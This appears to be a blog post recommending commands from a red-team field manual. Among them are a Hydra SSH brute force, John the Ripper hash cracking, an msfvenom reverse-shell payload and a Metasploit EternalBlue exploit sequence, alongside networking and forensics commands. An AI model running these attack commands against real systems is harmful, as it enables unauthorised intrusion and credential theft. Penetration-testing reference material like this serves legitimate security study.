**Commands and Techniques You'll Love**

Here are some commands and techniques you'll find in RTFM that I absolutely love, ready to copy and use in your infosec adventures:

1. **Enumeration Magic**:
   
   Discovering valuable information about your target is crucial. RTFM provides a variety of enumeration commands to help you get started:

   - SNMP Enumeration:
     ```
     snmpwalk -c public -v1 target_ip
     ```

   - SMB Enumeration (using Enum4linux):
     ```
     enum4linux -a target_ip
     ```

2. **Password Cracking**:

   When you need to crack passwords, RTFM offers tools and techniques to get the job done:

   - Using John the Ripper for cracking password hashes:
     ```
     john --wordlist=wordlist.txt --format=NT hash.txt
     ```

   - Employing Hydra for brute-force attacks:
     ```
     hydra -l username -P password_list.txt ssh://target_ip
     ```

3. **Exploitation Essentials**:

   Master common exploits and payloads with these handy commands:

   - Metasploit (launching a reverse shell payload):
     ```
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f exe > payload.exe
     ```

   - Exploiting a known vulnerability (example with EternalBlue):
     ```
     msfconsole
     use exploit/windows/smb/ms17_010_eternalblue
     set RHOSTS target_ip
     exploit
     ```

4. **Cheat Sheets Galore**:

   RTFM is packed with cheat sheets for various technologies and protocols. Here's an example for quick reference:

   - PowerShell Cheat Sheet (for basic commands):
     ```
     Get-Process
     Get-Service
     Get-NetAdapter
     ```

5. **Networking Ninja**:

   For all your networking needs, RTFM's networking section has got you covered:

   - Configuring a network interface (example with ifconfig):
     ```
     ifconfig eth0 up
     ifconfig eth0 192.168.1.2 netmask 255.255.255.0
     ```

   - Setting up an SSH tunnel:
     ```
     ssh -L local_port:target_ip:remote_port user@ssh_server
     ```

6. **Forensics and Incident Response**:

   When you're knee-deep in an incident response scenario, these commands come in handy:

   - Collecting volatile data using Volatility (example for memory analysis):
     ```
     volatility -f memory_dump.raw imageinfo
     volatility -f memory_dump.raw pslist
     ```

   - Checking for open ports and listening processes (example with netstat):
     ```
     netstat -tuln
     ```

Always use these commands responsibly in your infosec endeavors. 

Remember, with great power comes great responsibility! üïµÔ∏è‚Äç‚ôÇÔ∏èüîçüêç
